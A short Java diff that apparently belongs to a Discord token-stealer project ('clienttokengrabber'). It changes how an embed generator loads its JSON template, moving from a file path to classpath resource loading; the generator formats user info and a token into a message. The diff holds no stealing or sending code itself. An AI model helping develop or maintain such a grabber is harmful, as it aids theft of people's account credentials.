@@ -1,7 +1,7 @@
-package main.java.clienttokengrabber.utils;
+package clienttokengrabber.utils;
 
-import java.nio.file.Files;
-import java.nio.file.Path;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -11,7 +11,7 @@ import com.fasterxml.jackson.databind.node.ObjectNode;
 
 public class EmbedGenerator {
     private static final ObjectMapper objectMapper = new ObjectMapper();
-    private static final String TEMPLATE_PATH = "src/main/resources/EmbedTemplate.json";
+    private static final String TEMPLATE_PATH = "/EmbedTemplate.json";
 
     private static final Map<String, String> NITRO_TRANSLATION = Map.of(
             "0", "None",
@@ -22,7 +22,8 @@ public class EmbedGenerator {
 
     public static String generateEmbed(String userInfoJson, String token) {
         try {
-            JsonNode templateNode = objectMapper.readTree(Files.newBufferedReader(Path.of(TEMPLATE_PATH)));
+            InputStream templateStream = EmbedGenerator.class.getResourceAsStream(TEMPLATE_PATH);
+            JsonNode templateNode = objectMapper.readTree(new InputStreamReader(templateStream));
             Map<String, String> placeholders = createPlaceholders(userInfoJson, token);
             return populateTemplate(templateNode, placeholders).toString();
         } catch (Exception ignored) {}
